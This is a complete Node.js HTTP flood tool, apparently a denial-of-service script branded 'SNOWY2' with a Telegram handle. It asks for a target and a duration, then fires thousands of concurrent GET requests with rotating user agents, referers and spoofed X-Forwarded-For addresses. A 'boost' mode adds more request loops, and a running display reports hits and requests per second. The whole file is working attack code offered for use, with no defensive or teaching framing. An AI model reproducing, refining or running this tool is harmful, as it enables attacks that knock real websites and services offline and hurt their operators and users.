const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');
const readline = require('readline');
const pLimit = require('p-limit').default;

const CPU_COUNT = os.cpus().length;
const MAX_CONCURRENT = Math.min(CPU_COUNT * 150, 2000);
const REQUEST_TIMEOUT = 10000;

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const httpAgent = new http.Agent({
    keepAlive: true,
    maxSockets: Infinity,
});
const httpsAgent = new https.Agent({
    keepAlive: true,
    maxSockets: Infinity,
});

function loadLines(file) {
    try {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(l => l.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

function randItem(arr, fallback = '') {
    return arr[Math.floor(Math.random() * arr.length)] || fallback;
}

function randIp() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

class AttackEngine {
    constructor(target, duration, boost = false) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
        this.limit = pLimit(MAX_CONCURRENT);
        this.boost = boost;
        this.effects = ['🔥', '⚡', '💥', '⛏️', '🚀'];
        this.fxIndex = 0;
    }

    async makeRequest() {
        const headers = {
            'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
            'Referer': randItem(REFERERS, 'https://google.com'),
            'X-Forwarded-For': randIp()
        };

        try {
            await axios.get(this.target, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent,
                httpsAgent,
                maxRedirects: 0,
                validateStatus: null
            });
            return 'SUCCESS';
        } catch {
            return 'ERROR';
        }
    }

    displayStats() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed).toFixed(1);
        this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
        const fx = this.effects[this.fxIndex++ % this.effects.length];
        process.stdout.write(
            `\r${fx} POWER | RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
        );
    }

    async runLoop() {
        const batch = Array.from({ length: MAX_CONCURRENT }, () =>
            this.limit(() => this.makeRequest())
        );
        const results = await Promise.allSettled(batch);
        results.forEach(res => {
            this.stats.total++;
            if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
                this.stats.success++;
            } else {
                this.stats.errors++;
            }
        });
    }

    async runBoostLoop() {
        while (Date.now() - this.startTime < this.duration) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        const statInterval = setInterval(() => this.displayStats(), 150);

        const boosterThreads = [];
        if (this.boost) {
            for (let i = 0; i < CPU_COUNT; i++) {
                boosterThreads.push(this.runBoostLoop());
            }
        }

        while (Date.now() - this.startTime < this.duration) {
            await this.runLoop();
        }

        clearInterval(statInterval);
        process.stdout.write('\n');
        await Promise.allSettled(boosterThreads);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = (this.stats.total / elapsed).toFixed(1);
        console.log('\n\nATTACK FINISHED');
        console.log('='.repeat(60));
        console.log(`TARGET: ${this.target}`);
        console.log(`DURATION: ${elapsed.toFixed(1)}s`);
        console.log(`TOTAL REQUESTS: ${this.stats.total}`);
        console.log(`SUCCESS (200): ${this.stats.success}`);
        console.log(`ERRORS: ${this.stats.errors}`);
        console.log(`AVERAGE RPS: ${avgRps}`);
        console.log(`PEAK RPS: ${this.stats.peakRps.toFixed(1)}`);
        console.log('='.repeat(60));
    }
}

// MAIN
(async () => {
    console.log('\nSNOWY2 - T.ME/STSVKINGDOM');
    console.log('='.repeat(60));

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(res => rl.question(q, res));
    let target = await ask("TARGET: ");
    if (!target.startsWith("http")) target = "http://" + target;

    const duration = parseInt(await ask("TIME (seconds): "));
    const boost = await ask("ENABLE BOOST MODE? (yes/no): ");
    rl.close();

    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target.trim(), duration, boost.trim().toLowerCase() === 'yes');
    await engine.runAttack();
})();
